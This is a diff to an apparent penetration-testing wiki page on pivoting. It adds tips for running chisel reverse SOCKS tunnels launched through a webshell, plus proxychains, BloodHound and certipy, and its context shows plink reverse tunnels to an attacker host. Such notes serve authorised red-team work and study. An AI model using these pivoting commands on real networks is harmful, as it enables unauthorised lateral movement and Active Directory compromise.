@@ -26,8 +26,6 @@ arp -a
 
 ---
 
-## SSH Tunneling
-
 ### Prep — Tunnel User on Attacker Machine
 
 ```bash
@@ -78,8 +76,6 @@ plink.exe -ssh -l tunneluser -pw <pass> <attacker_ip> -R 9050 -N
 ```
 
 ---
-
-## proxychains
 
 ### /etc/proxychains.conf
 
@@ -133,8 +129,6 @@ netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TC
 ```
 
 ---
-
-## Metasploit Pivoting
 
 ### autoroute
 
@@ -342,3 +336,18 @@ netsh advfirewall firewall add rule name="pivot 8080" dir=in action=allow protoc
 - [[metasploit]] — MSF pivoting details
 - [[wiki/cheatsheets/nmap]] — scanning through proxychains
 - [[reverse-shells]] — catching shells through pivots
+
+## SOCKS pivot toolkit gotchas (chisel + proxychains + AD tools)
+
+- Launching the chisel client when the only execution channel is a webshell/HTTP request: `start /b <chisel.exe> client <attacker>:8001 R:socks` returns immediately so the HTTP request does not hang; the reverse SOCKS listener binds on the attacker at 127.0.0.1:1080.
+- `/etc/proxychains.conf` is root-owned: copy it out and point proxychains at the copy.
+
+```sh
+cp /etc/proxychains.conf /tmp/pc.conf && sed -i 's/^socks.*/socks5 127.0.0.1 1080/' /tmp/pc.conf
+proxychains -f /tmp/pc.conf -q <tool> ...
+```
+
+- BloodHound collection through the tunnel needs `--dns-server <dc>` AND `--dns-tcp` or DC discovery fails with "Could not find a domain controller" (UDP DNS does not traverse the SOCKS stream).
+- certipy over the tunnel needs `-ldap-scheme ldap`: the LDAPS TLS handshake breaks over a chisel SOCKS stream. If the pip install lands no console script, run it as `python3 -c "from certipy.entry import main; main()"`.
+
+<!-- promoted-slug: socks-pivot-toolkit-gotchas -->
